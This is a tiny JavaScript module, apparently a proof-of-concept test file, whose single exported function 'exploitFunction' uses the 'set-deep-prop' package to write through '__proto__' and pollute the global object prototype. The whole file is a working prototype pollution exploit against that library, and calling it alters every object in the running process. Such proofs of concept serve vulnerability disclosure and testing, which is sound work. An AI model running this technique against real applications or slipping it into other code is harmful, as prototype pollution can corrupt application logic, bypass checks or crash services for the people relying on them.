function exploitFunction(payload) {
    const setDeepProp = require("set-deep-prop");
    const obj = {};

    setDeepProp(obj, ["__proto__", "polluted"], "yes");
    return obj;
}

module.exports = { exploitFunction };